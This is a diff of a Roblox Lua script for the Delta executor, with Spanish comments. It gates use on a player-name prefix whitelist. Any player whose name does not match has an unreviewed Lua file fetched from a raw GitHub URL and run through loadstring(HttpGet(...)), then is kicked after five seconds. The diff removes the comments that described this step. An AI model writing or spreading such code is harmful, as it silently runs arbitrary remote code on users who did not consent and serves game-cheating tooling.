@@ -1,17 +1,15 @@
--- Sistema de Whitelist por Iniciales para Ejecutor Delta
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- Configuración
-local WHITELIST_PREFIXES = {"ICE"} -- Cambia esto según tus necesidades
+local WHITELIST_PREFIXES = {"L3G4CY"} 
 
 -- Función para verificar si un jugador está en la whitelist
 local function isInWhitelist(player)
-    local playerName = player.Name
+    local playerName = player.Name:upper() -- Convertir a mayúsculas
     
-    -- Verificar si el nombre del jugador comienza con alguno de los prefijos permitidos
     for _, prefix in ipairs(WHITELIST_PREFIXES) do
-        if string.sub(playerName:upper(), 1, #prefix) == prefix then
+        if string.sub(playerName, 1, #prefix) == prefix then
             return true
         end
     end
@@ -21,35 +19,19 @@ end
 
 -- Script a ejecutar si el jugador no está en la whitelist
 local function executeCustomScript()
-    -- Ejecutar el script específico para jugadores no whitelisteados
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FZKONTOP/A-a/refs/heads/main/A%C3%B1a.lua"))()
 end
 
 -- Verificar si el jugador local está en la whitelist
 if not isInWhitelist(LocalPlayer) then
-    -- Ejecutar el script adicional
     executeCustomScript()
-    
-    -- Esperar 5 segundos antes de expulsar al jugador
     wait(5)
-    
-    -- Expulsar al jugador
     LocalPlayer:Kick("No estás en la lista blanca. Acceso denegado.")
 end
 
--- =====================================================================
--- AQUÍ VA EL CÓDIGO PARA LOS USUARIOS EN WHITELIST
--- =====================================================================
-
--- Si el jugador pasa la verificación, puede continuar ejecutando otros scripts
 print("Acceso permitido. Puedes ejecutar otros scripts debajo de este.")
 
--- Puedes añadir aquí cualquier código que solo los usuarios en whitelist deben ejecutar:
-
--- O puedes cargar scripts externos:
--- loadstring(game:HttpGet("URL_DEL_SCRIPT_PARA_WHITELIST"))()
-
--- code limpio abajo
+-- Aquí va el código para usuarios whitelisted
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
 
